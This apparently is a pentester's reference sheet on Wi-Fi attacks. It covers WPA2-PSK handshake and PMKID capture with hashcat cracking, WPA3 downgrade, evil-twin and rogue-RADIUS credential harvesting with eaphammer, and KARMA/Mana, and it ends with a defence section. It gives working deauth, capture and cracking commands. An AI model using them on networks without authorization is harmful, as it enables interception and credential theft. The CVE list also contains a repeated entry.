# Wi-Fi Security

> WPA2-PSK / WPA3-SAE crack paths, evil-twin AP, KARMA / Mana, enterprise (WPA2-Enterprise) attacks. Authorized engagements on networks you own / are authorized to test. Don't probe random hotspots.

## TL;DR
- **WPA2-PSK** (most home / small-business Wi-Fi): capture a 4-way handshake or a PMKID (faster, no client needed) → offline crack with hashcat. Weak passphrases fall in hours.
- **WPA3-SAE** (Dragonfly handshake) blocks the offline brute angle in principle, but Dragonblood (2019) family + transition-mode downgrade keep WPA2-PSK attacks alive against WPA3-mixed APs.
- **WPA2-Enterprise (EAP)**: rogue RADIUS / evil-twin AP captures usernames + (depending on EAP type) MSCHAPv2 hashes for offline crack.
- **Evil-twin** + KARMA / Mana: forge a known SSID; clients with stored profiles auto-associate; intercept everything.
- Defence: WPA3-only when feasible; long random PSKs (≥ 20 chars) when PSK; EAP-TLS over PEAP; rogue-AP detection on WIPS.

## Hardware

| Adapter chipset | Why |
| --- | --- |
| Alfa AWUS036ACH (RTL8812AU) | Classic; monitor + injection on 2.4 / 5 GHz |
| Alfa AWUS036NHA (AR9271) | Cheap, 2.4 GHz, well-supported |
| Panda PAU09 | 2.4/5 GHz, supports `aircrack-ng` injection |

```bash
# Put adapter in monitor mode
sudo airmon-ng check kill        # stop NetworkManager / wpa_supplicant
sudo airmon-ng start wlan0       # wlan0 -> wlan0mon
iw dev                            # verify type = monitor
```

## Detection / Discovery

### Scan
```bash
sudo airodump-ng wlan0mon
# Filter on band: --band a  (5 GHz)   --band bg  (2.4 GHz)

# Focused capture on one BSSID
sudo airodump-ng -c <channel> --bssid <ap-mac> -w capture wlan0mon
```

### Identify stack
| Column / flag | Meaning |
| --- | --- |
| ENC | WPA2 / WPA3 / WPA / OPN |
| CIPHER | CCMP / TKIP |
| AUTH | PSK / MGT (Enterprise) / SAE |
| Mixed `PSK+SAE` | WPA3 transition mode — vulnerable to downgrade |

## Exploitation — WPA2-PSK

### 4-way handshake capture
1. Sniff with airodump-ng on the AP's channel.
2. Force a client to reauth — deauth attack:
   ```bash
   sudo aireplay-ng --deauth 5 -a <ap-mac> -c <client-mac> wlan0mon
   ```
3. When the client reassociates, airodump captures the EAPOL frames → `WPA handshake: <ap-mac>` in the airodump header.

### PMKID capture (no client needed)
PMKID is in the AP's first EAPOL message — sniff once + crack offline.
```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
sudo hcxpcapngtool -o pmkid.22000 pmkid.pcapng
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
```

### Crack
```bash
# Convert handshake cap to hash format
hcxpcapngtool -o handshake.22000 capture-01.cap

# WPA hashmode is 22000 (modern unified format, supersedes 2500 PMKID and 16800 EAPOL)
hashcat -m 22000 -a 0 handshake.22000 /usr/share/wordlists/rockyou.txt -r best64.rule
# Common starter rule combos: best64.rule, OneRuleToRuleThemAll, dive.rule
```

## Exploitation — WPA3

- **Pure WPA3-SAE**: offline brute infeasible (Dragonfly is PAKE).
- **WPA3 transition mode** (mixed PSK + SAE): downgrade-force client to WPA2 via deauth + spoofed beacon → WPA2-PSK attack works.
- **Dragonblood** (CVE-2019-9494/9495/13456/13377/13456) — side-channel password recovery on early WPA3 implementations. Patched on most vendor firmware; verify version.

## Exploitation — WPA2-Enterprise (EAP)

### EAP-PEAP-MSCHAPv2 (most common corporate Wi-Fi)
1. Stand up rogue RADIUS / evil-twin AP with same SSID:
   ```bash
   # eaphammer (https://github.com/s0lst1c3/eaphammer)
   sudo eaphammer --essid CORP_WIFI --interface wlan0 --auth peap --creds
   # or hostapd-wpe + freeradius-wpe (legacy)
   ```
2. Clients with stored PEAP profile + no server-cert validation → connect → leak username + MSCHAPv2 challenge/response.
3. Crack offline:
   ```bash
   # MSCHAPv2 hashmode 5500
   hashcat -m 5500 hashes.txt rockyou.txt
   ```
   `asleap` is an older alternative.

### EAP-TLS
Mutual cert auth. Attacker needs the user's client cert → eval (CWE-295 missing cert validation if the client doesn't verify the RADIUS cert).

### "Anonymous outer identity" exposure
Inner identity (`username@realm`) leaks via PEAP outer SSID announcements + DHCP option-12 hostname. Eavesdrop at the rogue AP for the actual username.

## Exploitation — Evil-twin / KARMA / Mana

- **Evil-twin**: same SSID, stronger signal → clients prefer attacker AP. Combined with deauth on real AP.
- **KARMA**: respond to *any* probe-request with "yes, that's me". Old Windows / Android happily associate to attacker's "free-wifi", "linksys", etc.
- **Mana**: KARMA variant defeating recent client fixes (loud-mode + per-SSID PMK).
- Tools: `eaphammer`, `wifiphisher`, `Berate_AP`, `airbase-ng`.

## Defence / Remediation
- **WPA3-only** (Personal-SAE / Enterprise 192-bit suite) where client compatibility allows. Disable WPA2 mixed mode.
- **Long random PSK** (≥ 20 chars, mixed-case + symbols + digits) when forced to use WPA2-PSK. Rotation policy.
- **EAP-TLS** for corporate Wi-Fi; client AND server cert validation required.
- **PEAP requires server cert validation** in clients — GPO setting `Validate server certificate` + pin the issuing CA, **not** check "Connect to these servers" only by name. Without pinning, evil-twin trivially defeats PEAP.
- **WIPS (Wireless IPS)** with rogue-AP detection — Cisco/Aruba/Ubiquiti have native modules.
- **PMF / 802.11w required** — disables deauth + disassoc spoofing (mandatory for WPA3, optional for WPA2).
- **MAC randomisation on clients** — limits client tracking but does NOT prevent KARMA-class against probe-request behaviour. Combine with "Restricted SSID list" policy on managed devices.
- **VLAN segmentation per Wi-Fi SSID** — guest / IoT / corp on separate VLANs; firewall between.

## Sources
- aircrack-ng suite: https://www.aircrack-ng.org/
- hcxdumptool / hcxtools: https://github.com/ZerBea/hcxdumptool, https://github.com/ZerBea/hcxtools
- hashcat WPA mode 22000 reference: https://hashcat.net/forum/thread-10253.html
- eaphammer: https://github.com/s0lst1c3/eaphammer
- wifiphisher: https://github.com/wifiphisher/wifiphisher
- Vanhoef — Dragonblood: https://wpa3.mathyvanhoef.com/
- Vanhoef — KRACK attacks: https://www.krackattacks.com/
- IEEE 802.11 standard (overview): https://standards.ieee.org/standard/802_11-2020.html
- Wi-Fi Alliance — WPA3 specification: https://www.wi-fi.org/discover-wi-fi/security
- MITRE ATT&CK Wi-Fi-adjacent: T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing)
